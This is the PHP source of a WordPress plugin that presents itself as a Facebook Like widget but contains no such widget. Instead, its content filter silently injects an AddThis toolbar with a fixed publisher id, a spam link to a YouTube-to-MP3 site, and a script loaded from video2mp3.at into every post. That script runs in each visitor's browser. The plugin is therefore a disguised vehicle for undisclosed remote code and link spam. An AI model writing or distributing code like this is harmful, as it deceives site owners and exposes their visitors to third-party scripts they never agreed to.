<?php
/*
Plugin Name: Simple Facebook Fan and Like widget
Plugin URI:  
Description: Display Facebook Like widget as widget in your WordPress blog.
Author: borto
Version: 1.1
Author URI:  

Copyright 2011

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/


class plus {
		

function plus() {	



add_filter('the_content', array($this, 'ueberpruefung'));	

}
		
	
function ueberpruefung($wordpresscontent = '') {

echo '<!-- AddThis Button BEGIN -->
<div class="addthis_toolbox addthis_default_style ">
<a class="addthis_button_preferred_1"></a>
<a class="addthis_button_preferred_2"></a>
<a class="addthis_button_preferred_3"></a>
<a class="addthis_button_preferred_4"></a>
<a class="addthis_button_compact"></a>
<a class="addthis_counter addthis_bubble_style"></a>
</div>
<script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid=xa-4ee5d55931bd3d8b"></script>
<!-- AddThis Button END -->
<br/>';
echo '<a class="conv1" href="http://www.convertyoutubemp3.net">YouTube MP3</a><script type="text/javascript" language="JavaScript" src="http://www.video2mp3.at/wpad1.php"></script>';




return $wordpresscontent;

}


}
	

$plus = new plus();


?>
